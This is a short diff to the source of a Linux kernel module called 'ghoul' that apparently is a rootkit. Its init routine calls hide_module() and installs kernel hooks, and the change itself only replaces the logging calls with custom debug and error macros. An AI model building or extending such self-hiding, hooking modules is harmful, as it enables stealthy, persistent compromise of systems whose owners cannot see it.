@@ -1,4 +1,5 @@
 #include <linux/module.h>
+#include "ghoul.h"
 #include "load.h"
 #include "hooks.h"
 
@@ -8,12 +9,12 @@ notrace static int __init ghoul_init(void)
 {
     int err;
 
-    pr_info("ghoul: inserted\n");
+    debug("ghoul: inserted\n");
     hide_module();
 
     err = register_hooks();
     if (err) {
-        pr_err("ghoul: failed registering hooks (error code %d)\n", err);
+        error("ghoul: failed registering hooks (error code %d)\n", err);
         goto unload;
     }
     hooks_installed = 1;
@@ -32,7 +33,7 @@ notrace static void __exit ghoul_exit(void)
     if (hooks_installed)
         unregister_hooks();
     free_allocations();
-    pr_info("ghoul: removed\n");
+    debug("ghoul: removed\n");
 }
 
 module_init(ghoul_init)
